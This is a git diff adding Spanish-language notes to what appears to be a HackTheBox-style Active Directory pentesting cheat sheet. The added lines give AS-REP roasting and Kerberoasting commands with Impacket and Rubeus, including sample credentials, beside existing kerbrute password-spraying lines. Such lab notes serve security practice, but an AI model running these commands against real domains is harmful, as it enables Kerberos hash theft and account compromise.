@@ -15,6 +15,36 @@ sudo ntpdate 10.10.11.129
 ./kerbrute passwordspray --dc CONTROLLER.local -d CONTROLLER.local users.txt Password123
 ```
 
+## AS-REP Roasting
+
+### Impacket
+
+```bash
+for user in $(cat users.txt); do impacket-GetNPUsers -dc-ip <ip_de_dominio> <dominio>/${user} -no-pass | grep -v Impacket; done
+```
+
+### Rubeus
+
+```powershell
+.\Rubeus.exe asreproast # ¿como admin? Ver si se necesitan credenciales
+# .\Rubeus.exe asreproast /creduser:htb.local\amanda /credpassword:Password123 # TODO Verificar
+```
+
+## Kerberoasting
+
+### Impacket
+
+```bash
+impacket-GetUserSPNs {dominio/usuario:contraseña} -dc-ip {ip de dominio} -request
+```
+
+### Rubeus
+
+```powershell
+.\Rubeus.exe kerberoast # Como Administrator
+.\Rubeus.exe kerberoast /creduser:htb.local\amanda /credpassword:Password123
+```
+
 ## BloodHound
 
 ### BloodHound.py
